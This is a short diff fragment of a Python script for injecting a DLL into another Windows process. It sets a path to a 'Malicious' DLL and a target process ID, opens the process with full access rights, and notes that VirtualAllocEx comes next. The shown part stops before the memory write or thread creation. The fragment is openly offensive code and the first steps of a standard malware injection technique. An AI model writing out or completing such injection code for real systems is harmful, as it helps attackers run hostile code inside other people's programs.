@@ -52,3 +52,13 @@ PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)
 
 dll = b"C:\Path\To\Malicious\DLL"
 pid = 9999 # process ID of process you want to inject into
+
+#open a handle to the target process, Flase is to not inherit Handle (parameters found in msdn documentation) 
+handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+
+if not handle:
+    raise WinError()
+
+print("Hooks in => {0:X}".format(handle))
+
+#Use VirtualAllocEx to create memory in the process
